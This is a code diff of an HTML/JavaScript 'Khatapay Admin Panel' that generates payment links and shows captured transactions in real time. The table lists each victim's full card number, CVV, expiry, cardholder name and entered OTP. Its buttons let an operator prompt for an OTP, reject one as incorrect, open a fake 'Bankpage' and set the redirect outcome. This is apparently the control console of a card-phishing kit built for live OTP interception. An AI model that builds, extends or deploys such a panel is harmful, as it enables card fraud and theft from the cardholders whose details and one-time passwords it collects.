@@ -3,17 +3,18 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Admin Panel</title>
+  <title>Khatapay Admin Panel</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
     body {
-      background: #000; 
+      background: #000;
       color: #fff;
-      font-family: Arial, sans-serif; 
+      font-family: Arial, sans-serif;
       padding: 20px;
     }
     h1 { 
-      text-align: center; 
-      margin-bottom: 20px; 
+      text-align: center;
+      margin-bottom: 20px;
     }
     .container {
       max-width: 1200px;
@@ -58,31 +59,31 @@
       margin-left: 10px;
     }
     table {
-      width: 100%; 
+      width: 100%;
       border-collapse: collapse;
-      background: #111; 
+      background: #111;
       margin-bottom: 20px;
     }
     th, td {
-      padding: 10px; 
+      padding: 10px;
       border: 1px solid #333;
-      text-align: left; 
+      text-align: left;
       font-size: 12px;
     }
-    th { 
-      background: #222; 
+    th {
+      background: #222;
     }
-    tr:nth-child(even) { 
-      background: #222; 
+    tr:nth-child(even) {
+      background: #222;
     }
     button {
-      background: #4a90e2; 
+      background: #4a90e2;
       color: #fff;
-      border: none; 
-      padding: 6px 10px; 
+      border: none;
+      padding: 6px 10px;
       margin-right: 4px;
-      cursor: pointer; 
-      border-radius: 4px; 
+      cursor: pointer;
+      border-radius: 4px;
       font-size: 12px;
     }
     button:hover {
@@ -91,14 +92,6 @@
     button:disabled {
       background: #666;
       cursor: not-allowed;
-    }
-    .refresh-btn {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      padding: 10px 20px;
-      background: #22c55e;
-      font-size: 14px;
     }
     .status-badge {
       padding: 2px 6px;
@@ -117,23 +110,11 @@
       border-radius: 4px;
       font-size: 12px;
     }
-    .show-otp-btn {
-      background: #22c55e;
-    }
-    .show-otp-btn:disabled {
-      background: #666;
-    }
-    .wrong-otp-btn {
-      background: #ef4444;
-    }
-    .wrong-otp-btn:hover {
-      background: #dc2626;
-    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Admin Panel</h1>
+    <h1>Khatapay Admin Panel</h1>
     
     <div class="generate-link">
       <h2>Generate Payment Link</h2>
@@ -178,9 +159,11 @@
     </table>
   </div>
 
+  <script src="/socket.io/socket.io.js"></script>
   <script>
-    let transactions = new Map();
-    
+    const socket = io();
+
+    // Generate Payment Link Handler
     document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const amount = document.getElementById('amount').value;
@@ -195,10 +178,14 @@
         if (data.status === 'success') {
           document.getElementById('paymentLink').textContent = data.paymentLink;
           document.getElementById('paymentLinkContainer').style.display = 'block';
+          alert('Payment link generated successfully');
+        } else {
+          throw new Error(data.message || 'Failed to generate link');
         }
       } catch (error) {
         console.error('Error generating payment link:', error);
-        alert('Failed to generate payment link');
+        alert(`ERROR: ${error.message}`);
+        document.getElementById('paymentLinkContainer').style.display = 'none';
       }
     });
 
@@ -208,94 +195,35 @@
       alert('Payment link copied to clipboard!');
     }
 
-    async function showOTP(id) {
-      try {
-        const response = await fetch("/api/showOTP", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id })
-        });
-        if (!response.ok) throw new Error('Failed to show OTP');
-        loadTransactions();
-      } catch (error) {
-        console.error('Error showing OTP:', error);
-        alert('Failed to show OTP. Please try again.');
-      }
-    }
-
-    async function markWrongOTP(id) {
-      try {
-        const response = await fetch("/api/wrongOTP", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id })
-        });
-        if (!response.ok) throw new Error('Failed to mark OTP as wrong');
-        loadTransactions();
-      } catch (error) {
-        console.error('Error marking OTP as wrong:', error);
-        alert('Failed to mark OTP as wrong. Please try again.');
-      }
-    }
-
-    async function updateStatus(id, status) {
-      try {
-        const response = await fetch("/api/updateRedirectStatus", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id, redirectStatus: status })
-        });
-        if (!response.ok) throw new Error('Failed to update status');
-        loadTransactions();
-      } catch (error) {
-        console.error('Error updating status:', error);
-        alert('Failed to update status. Please try again.');
-      }
-    }
-
     async function loadTransactions() {
       try {
-        const response = await fetch("/api/transactions");
+        const response = await fetch('/api/transactions');
         const data = await response.json();
-        const tbody = document.querySelector("#transactionsTable tbody");
+        const tbody = document.querySelector('#transactionsTable tbody');
         tbody.innerHTML = '';
         data.forEach(tx => {
           const row = document.createElement('tr');
           row.innerHTML = `
             <td>${tx.id}</td>
             <td>${tx.email}</td>
-            <td>${tx.amount}</td>
+            <td>₹${tx.amount}</td>
             <td>${tx.currency}</td>
             <td>${tx.cardNumber}</td>
             <td>${tx.cvv}</td>
             <td>${tx.expiry}</td>
             <td>${tx.cardholder}</td>
-            <td>
-              ${tx.otpEntered ? 
-                `<span class="otp-received">${tx.otpEntered}</span>
-                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
-                   Incorrect OTP
-                 </button>` : 
-                tx.otpShown ?
-                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
-                  `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
-                    Show OTP
-                  </button>`
-              }
-            </td>
+            <td>${tx.otpEntered ? tx.otpEntered : 'Waiting for OTP'}</td>
             <td>
               <span class="status-badge status-${tx.status || 'processing'}">
-                ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
+                ${tx.status ? tx.status.toUpperCase() : 'PROCESSING'}
               </span>
             </td>
             <td>
               ${!tx.redirectStatus ? `
-                <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
-                  Success
-                </button>
-                <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>
-                  Fail
-                </button>
+                <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>Success</button>
+                <button onclick="updateStatus('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}>Fail</button>
+                <button onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>Show OTP</button>
+                <button onclick="openBankPage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>Bankpage</button>
               ` : ''}
             </td>
           `;
@@ -305,6 +233,58 @@
         console.error('Error loading transactions:', error);
       }
     }
+
+    async function updateStatus(id, status) {
+      try {
+        const response = await fetch('/api/updateRedirectStatus', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ invoiceId: id, redirectStatus: status })
+        });
+        if (!response.ok) throw new Error('Failed to update status');
+        loadTransactions();
+      } catch (error) {
+        alert('Error updating status');
+      }
+    }
+
+    async function showOTP(id) {
+      try {
+        const response = await fetch('/api/showOTP', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to show OTP');
+        loadTransactions();
+      } catch (error) {
+        alert('Failed to show OTP');
+      }
+    }
+
+    async function openBankPage(id) {
+      // Open bankpage.html in a new tab with the invoice ID in query string
+      window.open(`/bankpage.html?invoiceId=${id}`, '_blank');
+    }
+
+    async function markWrongOTP(id) {
+      try {
+        const response = await fetch('/api/wrongOTP', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to mark OTP as wrong');
+        loadTransactions();
+      } catch (error) {
+        alert('Failed to mark OTP as wrong');
+      }
+    }
+
+    // Listen for refresh event via Socket.io
+    socket.on('refreshTransactions', () => {
+      loadTransactions();
+    });
 
     loadTransactions();
     setInterval(loadTransactions, 2000);
